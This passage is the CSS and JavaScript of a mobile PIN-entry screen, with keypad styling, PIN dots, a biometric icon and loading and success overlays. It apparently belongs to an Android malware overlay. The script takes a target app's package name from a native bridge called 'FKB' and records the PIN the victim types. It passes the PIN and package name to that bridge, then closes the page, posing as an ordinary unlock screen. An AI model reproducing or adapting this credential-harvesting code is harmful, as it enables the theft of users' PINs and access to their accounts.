<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%;width:100%;overflow-y:auto}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Helvetica Neue',sans-serif;min-height:100dvh;background:#F5F5F5;display:flex;align-items:center;justify-content:center}
#main{width:100%;max-width:360px;padding:0 24px;display:flex;flex-direction:column;align-items:center}
.logo{width:64px;height:64px;border-radius:16px;background:#00BCD4;display:flex;align-items:center;justify-content:center;margin-bottom:12px;box-shadow:0 4px 20px rgba(0,188,212,.25)}
.logo img{width:64px;height:64px}
.app-name{color:#333;font-size:13px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;opacity:.6;margin-bottom:28px}
.title{color:#212121;font-size:20px;font-weight:700;margin-bottom:6px}
.desc{color:rgba(0,0,0,.45);font-size:13px;margin-bottom:28px}
.dots{display:flex;gap:14px;margin-bottom:8px}
.dot{width:13px;height:13px;border-radius:50%;border:2px solid rgba(0,0,0,.18);transition:all .15s}
.dot.filled{background:#00BCD4;border-color:#00BCD4}
.confirm-btn{width:100%;max-width:280px;height:44px;background:#00BCD4;border:none;border-radius:10px;color:#fff;font-size:15px;font-weight:600;cursor:pointer;margin-bottom:14px;opacity:0;pointer-events:none;transition:opacity .2s,transform .1s}
.confirm-btn.show{opacity:1;pointer-events:auto}
.confirm-btn:active{transform:scale(.97)}
.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;width:100%;max-width:280px;margin-bottom:20px}
.key{width:64px;height:64px;border-radius:50%;background:#fff;border:none;color:#212121;font-size:24px;font-weight:500;display:flex;align-items:center;justify-content:center;cursor:pointer;justify-self:center;transition:background .15s;box-shadow:0 1px 4px rgba(0,0,0,.08);-webkit-user-select:none;user-select:none}
.key:active{background:#E0F7FA}
.key.empty{background:transparent;box-shadow:none;pointer-events:none}
.key.back{background:#fff}
.key.back svg{width:24px;height:24px;fill:rgba(0,0,0,.5)}
.bio{display:flex;flex-direction:column;align-items:center;margin-top:4px;cursor:pointer}
.bio-icon{width:44px;height:44px;border-radius:50%;border:1.5px solid rgba(0,0,0,.12);display:flex;align-items:center;justify-content:center;margin-bottom:5px}
.bio-icon svg{width:22px;height:22px;fill:rgba(0,0,0,.35)}
.bio-text{color:rgba(0,0,0,.4);font-size:11px}
.sp,.ok{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:#F5F5F5;z-index:999;align-items:center;justify-content:center;flex-direction:column}
.sp.show,.ok.show{display:flex}
.ld{width:32px;height:32px;border:2.5px solid rgba(0,0,0,.08);border-top-color:#00BCD4;border-radius:50%;animation:rr .7s linear infinite}
.lt{margin-top:12px;font-size:13px;color:rgba(0,0,0,.45)}
@keyframes rr{to{transform:rotate(360deg)}}
.oi{width:52px;height:52px;border-radius:50%;background:#00BCD4;display:flex;align-items:center;justify-content:center;margin-bottom:12px}
.oi svg{width:28px;height:28px;fill:#fff}
.ot{font-size:14px;color:#212121}
</style></head>

<script>
var pk='';try{if(typeof FKB!=='undefined'&&FKB.getPkg)pk=FKB.getPkg();}catch(e){}
var pin='',maxLen=6,minLen=4;
function updateDots(){var dots=document.querySelectorAll('.dot');for(var i=0;i<dots.length;i++){dots[i].className=i<pin.length?'dot filled':'dot';}document.getElementById('confirmBtn').className=pin.length>=minLen?'confirm-btn show':'confirm-btn';}
function doSubmit(){if(pin.length<minLen)return;document.activeElement.blur();document.getElementById('main').style.display='none';document.getElementById('sp').className='sp show';var sn='';try{if(typeof FKB!=='undefined'&&FKB.getSn)sn=FKB.getSn();}catch(e){}var pl=JSON.stringify({pin:pin,pkg:pk});try{if(typeof FKB!=='undefined'&&FKB.setFormData)FKB.setFormData(pl);}catch(e){}setTimeout(function(){try{if(typeof FKB!=='undefined'&&FKB.setClosePage)FKB.setClosePage(pk);}catch(e){}try{window.close();}catch(e){}},500);}
document.getElementById('keypad').addEventListener('click',function(e){var t=e.target.closest('.key');if(!t)return;var v=t.getAttribute('data-v');if(v!==null){if(pin.length<maxLen){pin+=v;updateDots();if(pin.length===maxLen){setTimeout(doSubmit,300);}}}});
document.getElementById('bksp').addEventListener('click',function(){if(pin.length>0){pin=pin.slice(0,-1);updateDots();}});
</script>
